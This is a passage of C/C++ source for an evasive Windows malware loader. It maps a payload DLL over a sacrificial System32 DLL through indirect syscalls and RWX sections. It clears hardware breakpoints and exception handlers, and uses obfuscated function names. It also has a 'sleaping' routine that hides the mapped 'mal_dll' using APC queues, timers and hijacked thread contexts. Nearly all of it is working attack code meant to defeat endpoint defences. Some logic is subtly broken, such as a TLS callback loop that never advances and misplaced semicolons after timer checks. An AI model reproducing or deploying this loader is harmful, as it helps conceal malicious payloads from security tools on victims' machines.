    }

    /* brute force reflective dll base address search */
    //current_module_base = (ULONG_PTR)ReflectiveFunction;
    //while (current_module_base)
    //{
    //    dll_hdr = (PDLL_HEADER)current_module_base;
    //    //if (dll_hdr->header = 0x44434241)
    //    //{
    //        img_dos_hdr = (PIMAGE_DOS_HEADER)(current_module_base);
    //        if (img_dos_hdr->e_magic == IMAGE_DOS_SIGNATURE)
    //        {
    //            img_nt_hdrs = (PIMAGE_NT_HEADERS)(current_module_base + img_dos_hdr->e_lfanew);

    //            if (img_nt_hdrs->Signature == IMAGE_NT_SIGNATURE)
    //                break;
    //        }

    //    //}
    //    current_module_base--;
    //}


    // here it still needs to be adjusted because there are the headers in
    // between, check some lines later

    //if (!current_module_base)
    //    return FALSE;

    //mem_to_free = (PBYTE)current_module_base;

    current_module_base = (ULONG_PTR)moduleBase;
    img_dos_hdr = (PIMAGE_DOS_HEADER)(current_module_base);
	img_nt_hdrs = (PIMAGE_NT_HEADERS)(current_module_base + img_dos_hdr->e_lfanew);
    PIMAGE_OPTIONAL_HEADER img_opt_hdr = (PIMAGE_OPTIONAL_HEADER)((ULONG_PTR)img_nt_hdrs
        + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER)); // skip nt_hdrs->Signature

    img_file_hdr = img_nt_hdrs->FileHeader;

    /*------------------------------LOADING SACRIFICAL DLL---------------------*/

    PBYTE sac_dll_base = NULL;
    CHAR sac_dll_path[] = { 'C', ':', '\\', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\','S','R','H','.','d','l','l','\0' };

    HMODULE sac_dll_module_by_LoadLibrary = NULL;
    sac_dll_module_by_LoadLibrary = func_LoadLibraryExA(sac_dll_path, NULL, DONT_RESOLVE_DLL_REFERENCES);

    unset_hwbp(DrIndex::DR1);
    unset_hwbp(DrIndex::DR2);
    unset_hwbp(DrIndex::DR3);
    
    func_RemoveVectoredExceptionHandler((PVECTORED_EXCEPTION_HANDLER)&VectorHandler);
    //func_RemoveVectoredExceptionHandler(g_VectoredHandlerHandle);

    sac_dll_base = (PBYTE)sac_dll_module_by_LoadLibrary;

    /* parse sacrificial dll to retrieve the size */
    PIMAGE_DOS_HEADER sac_dll_img_dos_hdr_ptr = NULL;
    PIMAGE_NT_HEADERS sac_dll_img_nt_hdr_ptr = NULL;
    PVOID sac_dll_mem_addr_for_syscall = NULL;
    SIZE_T sac_dll_payload_size_for_syscall = NULL;
    ULONG sac_dll_u_old_protection = NULL;

    if (sac_dll_base == NULL)
    {
        return FALSE;
    }

    sac_dll_img_dos_hdr_ptr = (PIMAGE_DOS_HEADER)sac_dll_base;
    if (sac_dll_img_dos_hdr_ptr->e_magic != IMAGE_DOS_SIGNATURE)
        return NULL;

    sac_dll_img_nt_hdr_ptr = (PIMAGE_NT_HEADERS)(sac_dll_base + sac_dll_img_dos_hdr_ptr->e_lfanew);
    if (sac_dll_img_nt_hdr_ptr->Signature != IMAGE_NT_SIGNATURE)
        return NULL;

    sac_dll_mem_addr_for_syscall = (PVOID)(sac_dll_base);

    // OptionalHeader.SizeOfImage records the memory size occupied by the loaded dll in memory.
    sac_dll_payload_size_for_syscall = (SIZE_T)sac_dll_img_nt_hdr_ptr->OptionalHeader.SizeOfImage;


    HANDLE sac_dll_handle = find_section_handle(zw_func_s, (fnGetProcessId)GPAR(hm_kernel32, str_GetProcessId));

    PVOID sac_dll = NULL;
    HANDLE dll_file = NULL;
    HANDLE new_section_handle = NULL;
    SIZE_T view_size = NULL;

    sac_dll_payload_size_for_syscall = sac_dll_payload_size_for_syscall + 32;

    // size of sacrifical dll( SRH.dll) + 24
    LARGE_INTEGER section_size = { sac_dll_payload_size_for_syscall };

    // create new section, which size is the size of sacrifical dll( SRH.dll) plus 24
    if (status = ZwCreateSection(
        &new_section_handle,
        SECTION_ALL_ACCESS,
        NULL,
        &section_size,
        PAGE_EXECUTE_READWRITE,
        SEC_COMMIT,
        NULL,
        zw_func_s[ZwCreateSectionF].SSN,
        zw_func_s[ZwCreateSectionF].sysretAddr
    ) != 0)
        return FALSE;

    // unmap the view of section of the SRH.dll mapped by LoadLibraryExA()
    if (status = ZwUnmapViewOfSection(
        ((HANDLE)(LONG_PTR)-1),
        sac_dll_module_by_LoadLibrary,
        zw_func_s[ZwUnmapViewOfSectionF].SSN,
        zw_func_s[ZwUnmapViewOfSectionF].sysretAddr
    ) != 0)
        return FALSE;

    // re-map the dll to first loaded address.
    sac_dll = (PVOID)sac_dll_module_by_LoadLibrary;
    if (status = ZwMapViewOfSection(
        new_section_handle,
        ((HANDLE)(LONG_PTR)-1),
        &sac_dll,			// anticipated address
        NULL,
        NULL,
        NULL,
        &sac_dll_payload_size_for_syscall, // mapped size
        ViewUnmap,
        NULL,
        PAGE_EXECUTE_READWRITE,
        zw_func_s[ZwMapViewOfSectionF].SSN,
        zw_func_s[ZwMapViewOfSectionF].sysretAddr
    ) != 0)
        return FALSE;

    // fixing the base address including the 16 bytes of header.
    // skip the custom header
    //current_module_base = current_module_base + (16);

    reflective_dll_base = (PBYTE)sac_dll;
    custom_memcpy_classic(reflective_dll_base, &sac_dll_handle, sizeof(HANDLE));
    reflective_dll_base += sizeof(HANDLE);
    custom_memcpy_classic(reflective_dll_base, &new_section_handle, sizeof(HANDLE));
    reflective_dll_base += sizeof(HANDLE);
    custom_memcpy_classic(reflective_dll_base, &sac_dll_payload_size_for_syscall, sizeof(SIZE_T));
    reflective_dll_base += sizeof(SIZE_T);
    custom_memcpy_classic(reflective_dll_base, &mem_to_free, sizeof(PBYTE));
    reflective_dll_base += sizeof(PBYTE);

	//custom_memcpy_classic(reflective_dll_base, (VOID*)current_module_base, 0x1000);

    // allocate memory to record the current pe section header pointers
    PVOID pe_section_temp = NULL;
    SIZE_T s_size = 0x0;
    s_size = sizeof(PIMAGE_SECTION_HEADER) * img_file_hdr.NumberOfSections;

    if ((status = ZwAllocateVirtualMemory(
        ((HANDLE)(LONG_PTR)-1),
        &pe_section_temp,
        0,
        &s_size,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_READWRITE,
        zw_func_s[ZwAllocateVirtualMemoryF].SSN,
        zw_func_s[ZwAllocateVirtualMemoryF].sysretAddr
    )) != 0)
        return FALSE;

    pe_section_ptr_array = (PIMAGE_SECTION_HEADER*)pe_section_temp;

    if (pe_section_ptr_array == NULL)
        return FALSE;

    for (int i = 0; i < img_file_hdr.NumberOfSections; i++)
    {
        pe_section_ptr_array[i] = (PIMAGE_SECTION_HEADER)(((PBYTE)img_nt_hdrs) + 4 + 20 + img_file_hdr.SizeOfOptionalHeader + (i * IMAGE_SIZEOF_SECTION_HEADER));
    }

    for (int i = 0; i < img_file_hdr.NumberOfSections; i++)
    {

		custom_memcpy_classic(
			(PVOID)(reflective_dll_base + pe_section_ptr_array[i]->VirtualAddress),
			(PVOID)(current_module_base + pe_section_ptr_array[i]->PointerToRawData),
			pe_section_ptr_array[i]->SizeOfRawData
		);
    }
    
	//custom_memzero(
	//	(PBYTE)(resolve_jmp_to_actual_function(ReflectiveFunction)),
	//	dll_hdr->funcSize
	//);
    
    char str_msvcp140d[] = { 'm', 's', 'v', 'c', 'p', '1', '4', '0', 'd', '.', 'd', 'l', 'l', '\0' };
    

    /* FIX IAT TABLE */
    for (size_t i = 0; i < img_opt_hdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size; i += sizeof(IMAGE_IMPORT_DESCRIPTOR))
    {

        img_imp_desc = (PIMAGE_IMPORT_DESCRIPTOR)(reflective_dll_base + img_opt_hdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress + i);
        if (img_imp_desc->OriginalFirstThunk == NULL && img_imp_desc->FirstThunk == NULL)
            break;

        char* import_module_name = (LPSTR)(reflective_dll_base + img_imp_desc->Name);

        if (str_icmp(import_module_name, str_msvcp140d))
            continue;

        dll = func_LoadLibraryA(import_module_name);
        if (dll == NULL)
            return FALSE;

        original_first_thunk = (PIMAGE_THUNK_DATA64)(reflective_dll_base + img_imp_desc->OriginalFirstThunk);
        first_thunk = (PIMAGE_THUNK_DATA64)(reflective_dll_base + img_imp_desc->FirstThunk);

        while (original_first_thunk->u1.Function != NULL && first_thunk->u1.Function != NULL)
        {
            if (original_first_thunk->u1.Ordinal & 0x8000000000000000)
            {
                import_func_ordinal = original_first_thunk->u1.Ordinal & 0xFFFF;
                import_func_address = GPARO(dll, (int)import_func_ordinal);
                if (import_func_address != nullptr)
                    first_thunk->u1.Function = (ULONGLONG)import_func_address;
            }
            else
            {
                pImgImportByName = (PIMAGE_IMPORT_BY_NAME)(reflective_dll_base + original_first_thunk->u1.AddressOfData);
                import_func_address = GPAR(dll, pImgImportByName->Name);
                if (import_func_address != nullptr)
                    first_thunk->u1.Function = (ULONGLONG)import_func_address;
            }

            original_first_thunk++;
            first_thunk++;
        }

    }

    /* APPLE BASE RELOCATIONS */
    delta = (ULONG_PTR)reflective_dll_base - img_opt_hdr->ImageBase;
    img_reloc = (PIMAGE_BASE_RELOCATION)(reflective_dll_base + img_opt_hdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

    while (img_reloc->VirtualAddress)
    {
        reloc_entry = (PBASE_RELOCATION_ENTRY)(img_reloc + 1);
        entries_count = (int)((img_reloc->SizeOfBlock - 8) / 2);

        for (int i = 0; i < entries_count; i++)
        {
            switch (reloc_entry->Type)
            {
            case IMAGE_REL_BASED_DIR64:
            {
                ULONGLONG* to_adjust = (ULONGLONG*)(reflective_dll_base + img_reloc->VirtualAddress + reloc_entry->Offset);
                *to_adjust += (ULONGLONG)delta;
            }
            break;
            case IMAGE_REL_BASED_HIGHLOW:
            {
                DWORD* to_adjust = (DWORD*)(reflective_dll_base + img_reloc->VirtualAddress + reloc_entry->Offset);
                *to_adjust += (DWORD)delta;
            }
            break;
            case IMAGE_REL_BASED_HIGH:
            {
                WORD* to_adjust = (WORD*)(reflective_dll_base + img_reloc->VirtualAddress + reloc_entry->Offset);
                *to_adjust += HIWORD(delta);
            }
            break;
            case IMAGE_REL_BASED_LOW:
            {
                WORD* to_adjust = (WORD*)(reflective_dll_base + img_reloc->VirtualAddress + reloc_entry->Offset);
                *to_adjust += LOWORD(delta);
            }
            break;
            case IMAGE_REL_BASED_ABSOLUTE:
                break;

            default:
                break;
            }
        }

        img_reloc = (PIMAGE_BASE_RELOCATION)(reinterpret_cast<DWORD_PTR>(img_reloc) + img_reloc->SizeOfBlock);

    }



    /* Adjust memory protections basing on section headers. */
    PVOID mem_addr_for_syscall = NULL;
    SIZE_T payload_size_for_syscall = NULL;
    ULONG u_old_protection = NULL;

    for (int i = 0; i < img_file_hdr.NumberOfSections; i++)
    {

        if ((SIZE_T)pe_section_ptr_array[i]->SizeOfRawData == 0)
            continue;

        // write
        if (pe_section_ptr_array[i]->Characteristics & IMAGE_SCN_MEM_WRITE)
        {
            section_protection = PAGE_WRITECOPY;
        }

        //read
        if (pe_section_ptr_array[i]->Characteristics & IMAGE_SCN_MEM_READ)
        {
            section_protection = PAGE_READONLY;
        }

        // execute
        if (pe_section_ptr_array[i]->Characteristics & IMAGE_SCN_MEM_EXECUTE)
        {
            section_protection = PAGE_EXECUTE;
        }

        // read and  write
        if (pe_section_ptr_array[i]->Characteristics & IMAGE_SCN_MEM_READ
            && pe_section_ptr_array[i]->Characteristics & IMAGE_SCN_MEM_WRITE)
        {
            section_protection = PAGE_READWRITE;
        }

        // execute and write
        if (pe_section_ptr_array[i]->Characteristics & IMAGE_SCN_MEM_EXECUTE
            && pe_section_ptr_array[i]->Characteristics & IMAGE_SCN_MEM_WRITE)
        {
            section_protection = PAGE_EXECUTE_WRITECOPY;
        }
        if (pe_section_ptr_array[i]->Characteristics & IMAGE_SCN_MEM_READ
            && pe_section_ptr_array[i]->Characteristics & IMAGE_SCN_MEM_EXECUTE)
        {
            section_protection = PAGE_EXECUTE_READ;
        }
        if (pe_section_ptr_array[i]->Characteristics & IMAGE_SCN_MEM_READ
            && pe_section_ptr_array[i]->Characteristics & IMAGE_SCN_MEM_EXECUTE
            && pe_section_ptr_array[i]->Characteristics & IMAGE_SCN_MEM_WRITE)
        {
            section_protection = PAGE_EXECUTE_READWRITE;
        }

        mem_addr_for_syscall = (PVOID)(reflective_dll_base + pe_section_ptr_array[i]->VirtualAddress);
        payload_size_for_syscall = (SIZE_T)pe_section_ptr_array[i]->SizeOfRawData;

        if ((status = ZwProtectVirtualMemory(
            ((HANDLE)(LONG_PTR)-1),
            &mem_addr_for_syscall,
            &payload_size_for_syscall,
            section_protection,
            &u_old_protection,
            zw_func_s[ZwProtectVirtualMemoryF].SSN,
            zw_func_s[ZwProtectVirtualMemoryF].sysretAddr
        )) != 0)
            return FALSE;

    }

    /* Register Exceptions handlers */
    if (img_opt_hdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size)
    {
        img_runtime_func_entry = (PIMAGE_RUNTIME_FUNCTION_ENTRY)(reflective_dll_base + img_opt_hdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress);
        if (!func_RtlAddFunctionTable(
            img_runtime_func_entry,
            (img_opt_hdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size / sizeof(PIMAGE_RUNTIME_FUNCTION_ENTRY)),
            (DWORD64)reflective_dll_base))
        {
            ; // do nothing
        }
    }

    /* Execute TLS callbacks */
    if (img_opt_hdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].Size)
    {
        img_tls_dict = (PIMAGE_TLS_DIRECTORY)(reflective_dll_base + img_opt_hdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress);
        tls_callbacks = (PIMAGE_TLS_CALLBACK*)(img_tls_dict->AddressOfCallBacks);

        int i = 0;
        while (tls_callbacks[i] != NULL)
        {
            tls_callbacks[i]((LPVOID)reflective_dll_base, DLL_PROCESS_ATTACH, NULL);
        }

    }


    /* Flushing Instruction Cache Alla Fewer */
    if ((status = ZwFlushInstructionCache(
        (HANDLE)-1,
        NULL, 0x00,
        zw_func_s[ZwFlushInstructionCacheF].SSN,
        zw_func_s[ZwFlushInstructionCacheF].sysretAddr)) != 0)
    {
        return FALSE;
    }

    __try {
        int x = 0;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
    }

    return reflective_dll_base;

}


bool _123321_asdf21425()
{
    WCHAR kernel32[] = { L'K', L'e', L'r', L'n', L'e', L'l', L'3', L'2', L'.', L'd', L'l', L'l', L'\0' };
    CHAR str_create_thread[] = { 'C','r','e','a','t','e','T','h','r','e','a','d','\0' };

    fnCreateThread fn_create_thread = NULL;
    if ((fn_create_thread = (fnCreateThread)GetProcAddress(GetModuleHandleW(kernel32), str_create_thread)) == NULL)
        return FALSE;

    fnDllMain p_dll_main = NULL;
    PBYTE pebase = NULL;
    PIMAGE_DOS_HEADER p_img_dos_hdr = NULL;
    PIMAGE_NT_HEADERS p_img_nt_hdrs = NULL;
    PDLL_HEADER p_dll_header = NULL;
    ULONG_PTR dll_base_addr = NULL;

    // lea rax, [rip + 0x0]
    dll_base_addr = (ULONG_PTR)_123321_asdf21425;

    while (TRUE)
    {

        p_dll_header = (PDLL_HEADER)dll_base_addr;

        //if (p_dll_header->header == 0x44434241) {
            p_img_dos_hdr = (PIMAGE_DOS_HEADER)(dll_base_addr + sizeof(DLL_HEADER));
            if (p_img_dos_hdr->e_magic == IMAGE_DOS_SIGNATURE)
            {
                p_img_nt_hdrs = (PIMAGE_NT_HEADERS)(dll_base_addr + p_img_dos_hdr->e_lfanew + sizeof(DLL_HEADER));

                if (p_img_nt_hdrs->Signature == IMAGE_NT_SIGNATURE)
                {
                    break;
                }
            }
        //}

        dll_base_addr--;

    }

    if (!dll_base_addr)
        return FALSE;

    PBYTE reflective_addr = NULL;
    BYTE KEY[4] = { '0', 'D', '0', '0' };
    //BYTE KEY[4] = {
    //    (BYTE)(p_dll_header->key & 0xFF),
    //    (BYTE)((p_dll_header->key >> 8) & 0xFF),
    //    (BYTE)((p_dll_header->key >> 16) & 0xFF),
    //    (BYTE)((p_dll_header->key >> 24) & 0xFF),
    //};

    reflective_addr = (PBYTE)resolve_jmp_to_actual_function(ReflectiveFunction);

    //// re-encrypting the reflective function
    //for (size_t i = 0, j = 0; i < (p_dll_header->funcSize); i++, j++)
    //{
    //    //if (j >= sizeof(p_dll_header->key))
    //    //{
    //    //	j = 0;
    //    //}
    //    reflective_addr[i] = reflective_addr[i] ^ KEY[j % 4];
    //}

    //// decrypting the reflective function
    //for (size_t i = 0, j = 0; i < (p_dll_header->funcSize); i++, j++)
    //{
    //    //if (j >= sizeof(p_dll_header->key))
    //    //{
    //    //	j = 0;
    //    //}
    //    reflective_addr[i] = reflective_addr[i] ^ KEY[j % 4];
    //}

    pebase = ReflectiveFunction();


    //p_dll_header->key = { 0 };

    //p_dll_main = (fnDllMain)(pebase + p_img_nt_hdrs->OptionalHeader.AddressOfEntryPoint);

    //HANDLE h_thread = fn_create_thread(
    //    NULL, 0, (LPTHREAD_START_ROUTINE)ThreadProc,
    //    (LPVOID)p_dll_main, 0, NULL
    //);

    //if (h_thread == NULL)
    //    return FALSE;

    return TRUE;

}

int foo1()
{
    SYSCALL_ENTRY zw_func_s[12] = { 0 };
    bool result = retrieve_zw_func_s(GetModuleHandleA("ntdll.dll"), zw_func_s);

    PBYTE sacDllBase = NULL;
    CHAR sacDllPath[] = { 'C', ':', '\\', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\','S','R','H','.','d','l','l','\0' };

    HMODULE sacModule = NULL;
    sacModule = LoadLibraryExA(sacDllPath, NULL, DONT_RESOLVE_DLL_REFERENCES);

    HANDLE h_file = NULL;
    HANDLE h_section = NULL;
    PVOID p_view = NULL;
    NTSTATUS status = 0;

    h_file = CreateFileA(
        sacDllPath,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (h_file == INVALID_HANDLE_VALUE) {
        printf("打开文件失败! 错误代码: %d\n", GetLastError());
        return 1;
    }

    status = NtCreateSection(
        &h_section,
        SECTION_ALL_ACCESS,
        NULL,
        NULL,
        PAGE_READONLY,
        SEC_COMMIT,
        h_file
    );

    if (status != STATUS_SUCCESS) {
        printf("创建Section失败! 状态代码: 0x%X\n", status);
        CloseHandle(h_file);
        return 1;
    }

    SIZE_T view_size = 0;
    status = NtMapViewOfSection(
        h_section,
        GetCurrentProcess(),
        &p_view,
        0,
        0,
        NULL,
        &view_size,
        ViewShare,
        0,
        PAGE_READONLY
    );

    if (status != STATUS_SUCCESS) {
        printf("映射视图失败! 状态代码: 0x%X\n", status);
        CloseHandle(h_section);
        CloseHandle(h_file);
        return 1;
    }

    printf("成功映射Section到视图!\n");
    printf("视图地址: 0x%p\n", p_view);
    printf("视图大小: %lld bytes\n", view_size);


    find_section_handle(zw_func_s, (fnGetProcessId)GetProcAddress(GetModuleHandleA("kernel32.dll"), "GetProcessId"));


}


bool init_func_addr(PFUNCTION_ADDRESSES func_addr)
{
    // handle to ntdll and user32
    HMODULE hm_ntdll = { 0 };
    HMODULE hm_user32 = { 0 };
    HMODULE hm_kernel32 = { 0 };
    if (!(hm_ntdll = GetModuleHandleA("ntdll"))) {
        return false;
    }
    if (!(hm_user32 = GetModuleHandleA("user32.dll"))) {
        return false;
    }
    if (!(hm_kernel32 = GetModuleHandleA("kernel32.dll"))) {
        return false;
    }
    // function pointers for thread contexts
    func_addr->NtTestAlertAddress = GetProcAddress(hm_ntdll, "NtTestAlert");
    func_addr->NtWaitForSingleObjectAddress = GetProcAddress(hm_ntdll, "NtWaitForSingleObject");
    func_addr->MessageBoxAddress = GetProcAddress(hm_user32, "MessageBoxA");
    func_addr->ResumeThreadAddress = GetProcAddress(hm_kernel32, "ResumeThread");

    if (func_addr->NtTestAlertAddress == NULL
        || func_addr->NtWaitForSingleObjectAddress == NULL
        || func_addr->MessageBoxAddress == NULL
        || func_addr->ResumeThreadAddress == NULL
        )
    {
        return false;
    }


    return true;
}


bool init_nt_func_s(PNT_FUNCTIONS nt_func_s)
{

    // Load the ntdll.dll library
    HMODULE hm_ntdll = GetModuleHandleA("ntdll.dll");
    if (hm_ntdll == NULL)
    {

        return false;
    }

    nt_func_s->NtWaitForSingleObject = (NtWaitForSingleObjectFunc)GetProcAddress(hm_ntdll, "NtWaitForSingleObject");//
    nt_func_s->NtQueueApcThread = (NtQueueApcThreadFunc)GetProcAddress(hm_ntdll, "NtQueueApcThread");//
    nt_func_s->NtGetContextThread = (NtGetContextThreadFunc)GetProcAddress(hm_ntdll, "NtGetContextThread");//
    nt_func_s->NtSetContextThread = (NtSetContextThreadFunc)GetProcAddress(hm_ntdll, "NtSetContextThread");//
    nt_func_s->NtCreateThreadEx = (NtCreateThreadExFunc)GetProcAddress(hm_ntdll, "NtCreateThreadEx"); // Added
    nt_func_s->NtCreateEvent = (NtCreateEventFunc)GetProcAddress(hm_ntdll, "NtCreateEvent");
    nt_func_s->NtResumeThread = (NtResumeThreadFunc)GetProcAddress(hm_ntdll, "NtResumeThread");//
    nt_func_s->NtQuerySystemInformation = (NtQuerySystemInformationFunc)GetProcAddress(hm_ntdll, "NtQuerySystemInformation");
    nt_func_s->NtQueryObject = (NtQueryObjectFunc)GetProcAddress(hm_ntdll, "NtQueryObject");
    nt_func_s->NtQueryInformationWorkerFactory = (NtQueryInformationWorkerFactoryFunc)GetProcAddress(hm_ntdll, "NtQueryInformationWorkerFactory");


    // Check if all function addresses were retrieved successfully
    if (!nt_func_s->NtResumeThread || !nt_func_s->NtWaitForSingleObject || !nt_func_s->NtQueueApcThread ||
        !nt_func_s->NtGetContextThread || !nt_func_s->NtSetContextThread || !nt_func_s->NtCreateThreadEx || !nt_func_s->NtCreateEvent
        || !nt_func_s->NtQueryInformationWorkerFactory || !nt_func_s->NtQueryObject || !nt_func_s->NtQuerySystemInformation) // Modified
    {

        return false;
    }

    return true;

}




/*

Main thread
    │
    ├─ Initialization phase (0-several ms)
    │   ├─ Create event object
    │   ├─ Allocate CONTEXT memory
    │   └─ Create thread 2 (suspended state)
    │
    ├─ Configure thread 2
    │   ├─ Get thread context
    │   ├─ Modify to WaitForSingleObjectEx(NtTestAlert returns)
    │   └─ Resume thread 2 execution
    │
    ├─ Create other threads
    │   ├─ CreateThread0 (suspended): UnmapViewOfFile
    │   ├─ CreateThread1 (suspended): MapViewOfFileEx(sac_dll)
    │   └─ CreateThread3 (suspended): MapViewOfFileEx(mal_dll)
    │
    ├─ Configure thread context
    │   ├─ Thread 0: UnmapViewOfFile(image_base)
    │   ├─ Thread 1: MapViewOfFileEx(sac_dll→image_base)
    │   └─ Thread 3: MapViewOfFileEx(mal_dll→image_base)
    │
    ├─ Create timer queue
    │
    ├─ Set APC queue (thread 2)
    │   ├─ APC1: UnmapViewOfFile(image_base)
    │   ├─ APC2: ResumeThread (Thread 3)
    │   └─ APC3: ExitThread (thread 2 itself)
    │
    ├─ Set timer
    │   ├─ Timer 1 (200ms): ResumeThread (Thread 0)
    │   └─ Timer 2 (300ms): ResumeThread (Thread 1)
    │
    └─ Wait for all threads to complete

*/

int sleaping(
    PVOID image_base,
    HANDLE sac_dll_handle,
    HANDLE mal_dll_handle,
    SIZE_T view_size,
    PNT_FUNCTIONS nt_func_s,
    PVOID NtTestAlert_addr
)
{

    HANDLE dummy_event = { 0 };
    HANDLE thread_array[4] = { NULL };

    HANDLE timer_queue = NULL;
    HANDLE new_timer = NULL;

    // create a manual sync event to sync threads
    if (!NT_SUCCESS(nt_func_s->NtCreateEvent(&dummy_event, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE)))
    {
        return -1;
    }

    // allocate thread context 
    CONTEXT* context_0 = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    CONTEXT* context_1 = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    CONTEXT* context_2 = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    CONTEXT* context_3 = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));

    if (context_0 == NULL
        || context_1 == NULL
        || context_2 == NULL
        || context_3 == NULL
        )
    {
        return -1;
    }

    context_0->ContextFlags = CONTEXT_ALL;
    context_1->ContextFlags = CONTEXT_ALL;
    context_2->ContextFlags = CONTEXT_ALL;
    context_3->ContextFlags = CONTEXT_ALL;


    // create a suspended waiting thread.
    thread_array[2] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WaitForSingleObjectEx, NULL, CREATE_SUSPENDED, NULL);
    if (thread_array[2] == NULL)
        return -1;

    // get the context of the waiting thread.
    if (!GetThreadContext(thread_array[2], context_2))
        return -1;

    // modify the context and set parameters.
    *(ULONG_PTR*)((*context_2).Rsp) = (DWORD64)NtTestAlert_addr;
    (*context_2).Rip = (DWORD64)WaitForSingleObjectEx;
    (*context_2).Rcx = (DWORD64)(dummy_event);
    (*context_2).Rdx = (DWORD64)21000;
    (*context_2).R8 = FALSE;

    if (!SetThreadContext(thread_array[2], context_2))
    {
        return -1;
    }

    // wait + APCs
    // resume the thread that is going to wait the sleep time and then execute the APCs
    if (!ResumeThread(thread_array[2]))
    {
        return -1;
    }

    // create a thread to control
    thread_array[0] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)UnmapViewOfFile, NULL, CREATE_SUSPENDED, NULL);
    if (thread_array[0] == NULL)
    {
        return -1;
    }

    thread_array[1] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MapViewOfFileEx, NULL, CREATE_SUSPENDED, NULL);
    if (thread_array[1] == NULL)
    {
        return -1;
    }

    thread_array[3] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MapViewOfFileEx, NULL, CREATE_SUSPENDED, NULL);
    if (thread_array[3] == NULL)
    {
        return -1;
    }

    if (!GetThreadContext(thread_array[0], context_0))
        return -1;

    if (!GetThreadContext(thread_array[1], context_1))
        return -1;

    if (!GetThreadContext(thread_array[3], context_3))
        return -1;


    // timer triggered
    *(ULONG_PTR*)((*context_0).Rsp) = (DWORD64)(ExitThread);
    (*context_0).Rip = (DWORD64)UnmapViewOfFile;
    (*context_0).Rcx = (DWORD64)(image_base);

    *(ULONG_PTR*)((*context_1).Rsp) = (DWORD64)(ExitThread);
    (*context_1).Rip = (DWORD64)MapViewOfFileEx;
    (*context_1).Rcx = (DWORD64)sac_dll_handle;
    (*context_1).Rdx = FILE_MAP_ALL_ACCESS;
    (*context_1).R8 = (DWORD64)0x0;
    (*context_1).R9 = (DWORD64)0x0;

    // the offset must be the either hex 28 or int 40
    *(ULONG_PTR*)((*context_1).Rsp + 40) = 0x0;
    *(ULONG_PTR*)((*context_1).Rsp + 48) = (ULONG_PTR)image_base;


    // apc triggered
    *(ULONG_PTR*)((*context_3).Rsp) = (DWORD64)ExitThread;
    (*context_3).Rip = (DWORD64)MapViewOfFileEx;
    (*context_3).Rcx = (DWORD64)mal_dll_handle;
    (*context_3).Rdx = FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE;
    (*context_3).R8 = (DWORD64)0x00;
    (*context_3).R9 = (DWORD64)0x00;

    // the offset must be the either hex 28 or int 40
    *(ULONG_PTR*)((*context_3).Rsp + 40) = 0x0;
    *(ULONG_PTR*)((*context_3).Rsp + 48) = (ULONG_PTR)image_base;

    if (!SetThreadContext(thread_array[0], context_0))
    {
        return -1;
    }
    if (!SetThreadContext(thread_array[1], context_1))
    {
        return -1;
    }
    if (!SetThreadContext(thread_array[3], context_3))
    {
        return -1;
    }

    timer_queue = CreateTimerQueue();
    if (timer_queue == NULL)
    {
        return -1;
    }

    if (!NT_SUCCESS(nt_func_s->NtQueueApcThread(thread_array[2], (PPS_APC_ROUTINE)UnmapViewOfFile, image_base, FALSE, NULL)))
    {
        return -1;
    }
    if (!NT_SUCCESS(nt_func_s->NtQueueApcThread(thread_array[2], (PPS_APC_ROUTINE)ResumeThread, thread_array[3], FALSE, NULL)))
    {
        return -1;
    }
    if (!NT_SUCCESS(nt_func_s->NtQueueApcThread(thread_array[2], (PPS_APC_ROUTINE)ExitThread, NULL, FALSE, NULL)))
    {
        return -1;
    }

    // unmap
    if (!CreateTimerQueueTimer(&new_timer, timer_queue, (WAITORTIMERCALLBACK)ResumeThread, thread_array[0], 200, 0, WT_EXECUTEINTIMERTHREAD));
    {
        return -1;
    }

    // map
    if (!CreateTimerQueueTimer(&new_timer, timer_queue, (WAITORTIMERCALLBACK)ResumeThread, thread_array[1], 300, 0, WT_EXECUTEINTIMERTHREAD));
    {
        return -1;
    }

    if (WaitForMultipleObjects(4, thread_array, TRUE, INFINITE) == WAIT_FAILED)
    {
        return -1;
    }

    if (new_timer != NULL)
    {
        if (DeleteTimerQueueTimer(timer_queue, new_timer, NULL) == 0)
        {
            return -1;
        }
    }

    if (context_0) VirtualFree(context_0, 0, MEM_RELEASE);
    if (context_1) VirtualFree(context_0, 0, MEM_RELEASE);
    if (context_2) VirtualFree(context_0, 0, MEM_RELEASE);
    if (context_3) VirtualFree(context_0, 0, MEM_RELEASE);

    if (dummy_event) CloseHandle(dummy_event);

    return -1;
}


static std::vector<char> load_local_file(const std::string& file_path)
{
    std::vector<char> buffer;

    try
    {
